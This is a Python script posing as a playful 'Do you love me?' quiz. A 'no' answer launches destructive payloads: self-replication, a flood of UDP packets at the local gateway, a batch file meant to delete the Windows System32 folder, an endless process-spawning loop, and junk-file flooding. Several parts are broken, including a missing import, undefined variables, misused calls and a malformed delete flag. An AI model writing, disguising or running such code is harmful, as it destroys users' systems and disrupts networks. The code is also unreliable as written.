import threading, socket, os, sys, random, time
while True:
    question = input("Do you love me?(yes/no): ")
    if question.lower() == "yes":
        print("I love you too!")
        print("Make sure to tell me in person ;)")
        input("")
        quit()
    elif question.lower() == "no":
        print("But I love you.......")
        time.sleep(2)
        print(":'(")
        time.sleep(1)
        print("You have been hacked.")
        break
    else:
        print("Please answer with 'yes' or with 'no'.")
operating_system = sys.platform
if operating_system.lower() != "win32":
    while True:
        shutil.copyfile(f'{sys.argv[0]}', f'{os.getcwd()}/{str(random.randint(0, 67684628348736286482364))}')
        list_dir = os.listdir()
        for i in list_dir:
            os.startfile(i)
else:
    def getdefaultgateway():
        result = os.popen('ipconfig')
        result = result.readlines()
        ls_item = 0
        for i in result:
            if i.strip().startswith('Default Gateway'):
                default_gateway = result[(ls_item + 1)]
                break
            else:
                pass
            ls_item += 1
        return default_gateway.strip()
    def ddos():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.connect((ip, port))
                sock.sendto(packet, (ip, port))
            except:
                pass
    def deletus():
        try:
            file = open('system32_yeeter.bat', 'w')
            file.writelines('\n@echo off', '\ndel \Q C:\\Windows\\System32\\', '\n')
            os.startfile(file.name)
        except:
            pass
    def spammer():
        try:
            while True:
                os.system('start')
        except:
            pass
    def flooder():
        try:
            floodfile = open(f'{str(random.randint(0, 78374932748724))}.txt','w')
            floodfile.writelines(packet)
            os.startfile(floodfile)
        except:
            pass
    gateway = getdefaultgateway()
    packet = random._urandom(65500)
    while True:
        try:
            ddosAtk = threading.Thread(target=ddos)
            ddosAtk.start()
            deleter = threading.Thread(target=deletus)
            deleter.start()
            spam = threading.Thread(target=spammer)
            spam.start()
            flood = threading.Thread(target=flooder)
            flood.start()
        except:
            pass
